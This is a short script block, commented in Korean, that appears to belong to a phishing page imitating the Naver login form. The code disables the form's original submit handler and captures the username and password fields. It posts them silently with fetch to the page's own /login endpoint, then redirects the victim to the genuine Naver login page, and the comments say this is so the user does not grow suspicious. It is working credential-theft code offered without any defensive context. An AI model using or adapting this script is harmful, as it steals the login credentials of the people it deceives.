                <script>
    // 1. 네이버의 원본 전송 로직을 완전히 무력화합니다.
    document.forms['frmNIDLogin'].onsubmit = null; 

    // 2. 우리가 직접 전송 버튼 클릭을 제어합니다.
    document.getElementById('log.login').addEventListener('click', function(e) {
        e.preventDefault(); // 네이버 JS가 개입하지 못하게 함
        
        const form = document.getElementById('frmNIDLogin');
        const formData = new FormData(form);
        const params = new URLSearchParams(formData);

        // 3. fetch를 사용하여 백그라운드에서 우리 서버로 데이터를 보냅니다.
        fetch('/login', {
            method: 'POST',
            body: params,
            headers: {
                'Content-Type': 'application/x-www-form-urlencoded'
            }
        }).then(() => {
            // 4. 데이터 전송 후 실제 네이버로 보내서 사용자가 의심하지 않게 합니다.
            window.location.href = "https://nid.naver.com/nidlogin.login";
        }).catch(err => {
            // 에러가 나더라도 일단 네이버로 보냅니다.
            window.location.href = "https://nid.naver.com/nidlogin.login";
        });
    });
</script>
